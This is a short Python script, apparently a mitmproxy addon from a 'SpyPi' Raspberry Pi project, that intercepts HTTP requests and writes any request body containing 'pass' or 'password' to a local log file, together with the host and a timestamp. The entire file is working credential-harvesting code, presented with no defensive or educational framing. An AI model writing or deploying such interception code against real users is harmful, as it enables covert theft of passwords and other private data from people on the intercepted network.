# Sarah M. - 2017

import sys
import datetime
from colors import farben

def request(flow):
    now = datetime.datetime.now()
    content = flow.request.get_text()
    host = flow.request.pretty_host
    method = flow.request.method
    if method == "POST" and ("pass" in content) or ("password" in content) :
        with open ("/home/pi/SpyPi/Code/proxy.txt", "a") as myfile:
            myfile.write(farben.AUF + str(now) +" // " + farben.END)
            myfile.write(farben.LD + host + farben.END)
            myfile.write("\n")
            myfile.write(farben.IN + content + farben.END)
            myfile.write("\n")
            myfile.write("\n")
